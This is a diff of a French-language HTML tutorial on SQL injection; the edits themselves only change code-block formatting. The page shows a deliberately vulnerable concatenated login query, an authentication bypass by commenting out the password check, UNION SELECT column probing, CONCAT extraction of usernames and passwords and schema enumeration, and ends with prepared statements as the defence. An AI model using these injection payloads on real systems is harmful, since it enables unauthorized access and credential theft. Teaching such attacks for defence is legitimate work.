@@ -221,7 +221,7 @@
 </div></div>
 <p>Par exemple lors d'une connexion, un utilisateur rentre son nom d'utilisateur et son mot de passe. Puis le serveur authentifie l'utilisateur en vérifiant que les données saisies sont bien présentes dans la base de donnée des utilisateurs :</p>
 <h4 id="h4-1-1"> Requete envoyé par l'utilisateur pour s'authentifier </h4>
-<pre class="language-javascript " style="counter-reset: linenumber 0"><code class="language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"https://nomDuServeur/login"</span><span class="token punctuation">,</span>
+<pre class="language-javascript"><code class="language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"https://nomDuServeur/login"</span><span class="token punctuation">,</span>
 <span class="token punctuation">{</span>
     <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>                     <span class="token comment">//permet d'envoyer des données au serveur</span>
     <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>
@@ -230,14 +230,11 @@
         <span class="token literal-property property">password</span> <span class="token operator">:</span> <span class="token string">"mon_password"</span>
       <span class="token punctuation">}</span>
     <span class="token punctuation">)</span>
-<span class="token punctuation">}</span><span class="token punctuation">)</span>
-</code></pre>
+<span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre>
 <h4 id="h4-1-2"> Interprétation par le serveur </h4>
-<pre class="language-sql " style="counter-reset: linenumber 0"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">' + requete.username + '</span> <span class="token operator">AND</span> password <span class="token operator">=</span> <span class="token string">' + requete.password + '</span>
-</code></pre>
+<pre class="language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">' + requete.username + '</span> <span class="token operator">AND</span> password <span class="token operator">=</span> <span class="token string">' + requete.password + '</span></code></pre>
 <p>ce qui donne ici :</p>
-<pre class="language-sql " style="counter-reset: linenumber 0"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'mon_username'</span> <span class="token operator">AND</span> password <span class="token operator">=</span> <span class="token string">'mon_password'</span>
-</code></pre>
+<pre class="language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'mon_username'</span> <span class="token operator">AND</span> password <span class="token operator">=</span> <span class="token string">'mon_password'</span></code></pre>
 <h4 id="h4-1-3"> Attaquer cette mécanique </h4>
 <p>L'objectif est de ne pas avoir à passer l'étape de vérification du mot de passe.</p>
 <p>Pour ça, on va utiliser une mécanique assez simple en programmation : <strong>les commentaires</strong>.</p>
@@ -250,7 +247,7 @@
 Pour une base de donnée qui utilise MySQL, les commentaires sont fait par <strong>#</strong> qui vaut <strong>%23</strong> en hexadécimal</p>
 </div></div>
 <p>Donc si on termine le <em>username</em> envoyé dans la requête par un comentaire, il n'y aura pas de vérificaton du <em>password</em>.</p>
-<pre class="language-javascript " style="counter-reset: linenumber 0"><code class="language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"https://nomDuServeur/login"</span><span class="token punctuation">,</span>
+<pre class="language-javascript"><code class="language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"https://nomDuServeur/login"</span><span class="token punctuation">,</span>
 <span class="token punctuation">{</span>
     <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
     <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>
@@ -259,8 +256,7 @@ Pour une base de donnée qui utilise MySQL, les commentaires sont fait par <stro
         <span class="token literal-property property">password</span> <span class="token operator">:</span> <span class="token string">"n'importeQuoi"</span>
       <span class="token punctuation">}</span>
     <span class="token punctuation">)</span>
-<span class="token punctuation">}</span><span class="token punctuation">)</span>
-</code></pre>
+<span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre>
 <div class="quote relative drop-shadow  py-2 pr-2 rounded rounded-tl-none rounded-bl-none border-solid border-l-8 border-amber-800 bg-amber-100">
 <svg class="absolute w-7 h-7 pl-1 pt-0.5 pb-0.5 text-amber-800" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
   <path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
@@ -271,8 +267,7 @@ Pourquoi on utilise ça plutôt que <strong>'</strong> ?
 Le serveur va rajouter un caractère d'échappement devant les caractères qu'il utilise notamment <strong>'</strong>, mais pas devant sa forme hexadécimale <strong>%27</strong></p>
 </div></div>
 <h4 id="h4-1-4"> Interprétation de la requête par le serveur </h4>
-<pre class="language-sql " style="counter-reset: linenumber 0"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'administarteur'</span><span class="token comment">--' AND password = 'n\'importeQuoi'</span>
-</code></pre>
+<pre class="language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'administarteur'</span><span class="token comment">--' AND password = 'n\'importeQuoi'</span></code></pre>
 <div class="quote relative  py-2 drop-shadow rounded rounded-tl-none rounded-bl-none border-solid border-l-8 border-cyan-500 bg-cyan-100">
 <svg class="absolute w-7 h-7 pl-1 pt-0.5 pb-0.5 text-cyan-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
   <path stroke-linecap="round" stroke-linejoin="round" d="M9.663 17h4.673M12 3v1m6.364 1.636l-.707.707M21 12h-1M4 12H3m3.343-5.657l-.707-.707m2.828 9.9a5 5 0 117.072 0l-.548.547A3.374 3.374 0 0014 18.469V19a2 2 0 11-4 0v-.531c0-.895-.356-1.754-.988-2.386l-.548-.547z"></path>
@@ -310,8 +305,7 @@ ex : le nom et prénom sont 2 chaines de caractères, la 2e recherche devra envo
 <li>Ordonner la première recherche selon la nième colonne, grace au mot clé <strong>ORDER BY n</strong>, si il y a une errreur c'est que la colonne <strong>n</strong> n'existe pas.</li>
 <li>Faire une 2e recherche (avec une <strong>UNION</strong>) en envoyant simplement des <strong>NULL</strong>, l'objectif étant de trouver combien on peut mettre de <strong>NULL</strong> sans avoir d'erreur :</li>
 </ul>
-<pre class="language-sql " style="counter-reset: linenumber 0"><code class="language-sql"><span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span>
-</code></pre>
+<pre class="language-sql"><code class="language-sql"><span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span></code></pre>
 <div class="quote relative drop-shadow  py-2 pr-2 rounded rounded-tl-none rounded-bl-none border-solid border-l-8 border-amber-800 bg-amber-100">
 <svg class="absolute w-7 h-7 pl-1 pt-0.5 pb-0.5 text-amber-800" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
   <path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
@@ -319,8 +313,7 @@ ex : le nom et prénom sont 2 chaines de caractères, la 2e recherche devra envo
 <div class="pl-8 mr-8">
 <p>Remarque 1 : il n'est pas possible pour une base de donnée Oracle de faire des requêtes sans le mot clé <strong>FROM</strong>, pour cela, il existe une table faite pour ça : <strong>dual</strong></p>
 </div></div>
-<pre class="language-sql " style="counter-reset: linenumber 0"><code class="language-sql"><span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span> <span class="token keyword">FROM</span> dual
-</code></pre>
+<pre class="language-sql"><code class="language-sql"><span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span> <span class="token keyword">FROM</span> dual</code></pre>
 <div class="quote relative drop-shadow  py-2 pr-2 rounded rounded-tl-none rounded-bl-none border-solid border-l-8 border-amber-800 bg-amber-100">
 <svg class="absolute w-7 h-7 pl-1 pt-0.5 pb-0.5 text-amber-800" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
   <path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
@@ -334,8 +327,7 @@ ex : le nom et prénom sont 2 chaines de caractères, la 2e recherche devra envo
 <p>La remarque faite sur Oracle dans la précédente partie est toujours applicable ici.</p>
 <h4 id="h4-2-4"> 1 seule colonne </h4>
 <p>Si un il y a uniquement un champ <em>string</em> disponible, et qu'on veut afficher plusieurs sorties en même temps (par exemple le <em>username</em> et le <em>password</em> d'un utilisateur), on peut utiliser la fonction <strong>CONCAT</strong> de SQL:</p>
-<pre class="language-sql " style="counter-reset: linenumber 0"><code class="language-sql"><span class="token keyword">SELECT</span> CONCAT<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users
-</code></pre>
+<pre class="language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> CONCAT<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users</code></pre>
 <h4 id="h4-2-5"> Versions </h4>
 <p>Il peut être interressant de connaitre la version de la base de donnée pour effectuer des attaques ciblées sur la version.
 Les requêtes dépendent de la base de donnée :</p>
@@ -349,14 +341,12 @@ Les requêtes dépendent de la base de donnée :</p>
 <h4 id="h4-2-6"> Avoir le nom des tables </h4>
 <p>Pour effectuer nos recherche, il faut avoir le nom des tables et de colonnes, pour cela on peut effectuer, dans un requete <strong>UNION</strong>, les recherches suivantes :</p>
 <p><strong>Non Oracle</strong></p>
-<pre class="language-sql " style="counter-reset: linenumber 0"><code class="language-sql"><span class="token keyword">SELECT</span> TABLE_NAME <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span>
+<pre class="language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> TABLE_NAME <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span>
 <span class="token keyword">SELECT</span> COLUMN_NAME <span class="token keyword">FROM</span> INFORMATION_SCHEMA<span class="token punctuation">.</span><span class="token keyword">COLUMNS</span> <span class="token keyword">WHERE</span> TABLE_NAME <span class="token operator">=</span> <span class="token string">'TABLE-NAME-HERE'</span>
-
 </code></pre>
 <p><strong>Oracle</strong></p>
-<pre class="language-sql " style="counter-reset: linenumber 0"><code class="language-sql"><span class="token keyword">SELECT</span> TABLE_NAME <span class="token keyword">FROM</span> all_tables
-<span class="token keyword">SELECT</span> COLUMN_NAME <span class="token keyword">FROM</span> all_tab_columns <span class="token keyword">WHERE</span> TABLE_NAME <span class="token operator">=</span> <span class="token string">'TABLE-NAME-HERE'</span>
-</code></pre>
+<pre class="language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> TABLE_NAME <span class="token keyword">FROM</span> all_tables
+<span class="token keyword">SELECT</span> COLUMN_NAME <span class="token keyword">FROM</span> all_tab_columns <span class="token keyword">WHERE</span> TABLE_NAME <span class="token operator">=</span> <span class="token string">'TABLE-NAME-HERE'</span></code></pre>
 <div class="quote relative drop-shadow  py-2 pr-2 rounded rounded-tl-none rounded-bl-none border-solid border-l-8 border-amber-800 bg-amber-100">
 <svg class="absolute w-7 h-7 pl-1 pt-0.5 pb-0.5 text-amber-800" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
   <path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
@@ -376,15 +366,13 @@ Les requêtes dépendent de la base de donnée :</p>
 <h2 id="h5"> Défense </h2>
 <p>Il est possible de paramétrer une requête SQL, c'est-à-dire transformer une requête en une fonction prenant en paramètre les valeurs de la requête.</p>
 <p>Au lieu d'executer :</p>
-<pre class="language-javascript " style="counter-reset: linenumber 0"><code class="language-javascript">String query <span class="token operator">=</span> <span class="token string">"SELECT * FROM products WHERE category = '"</span><span class="token operator">+</span> input <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">;</span>
+<pre class="language-javascript"><code class="language-javascript">String query <span class="token operator">=</span> <span class="token string">"SELECT * FROM products WHERE category = '"</span><span class="token operator">+</span> input <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">;</span>
 Statement statement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-ResultSet resultSet <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>
-</code></pre>
+ResultSet resultSet <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 <p>On crée un statement sans les valeurs, puis on ajoute les paramètres :</p>
-<pre class="language-javascript " style="counter-reset: linenumber 0"><code class="language-javascript">PreparedStatement statement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM products WHERE category = ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<pre class="language-javascript"><code class="language-javascript">PreparedStatement statement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM products WHERE category = ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 statement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> input<span class="token punctuation">)</span><span class="token punctuation">;</span>
-ResultSet resultSet <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-</code></pre>
+ResultSet resultSet <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 <p>Voici les 3 liens où on peut retrouver des exemples de code en fonction des languages utilisés :</p>
 <ul>
 <li><a href="https://www.hacksplaining.com/prevention/sql-injection">hacksplaining</a></li>
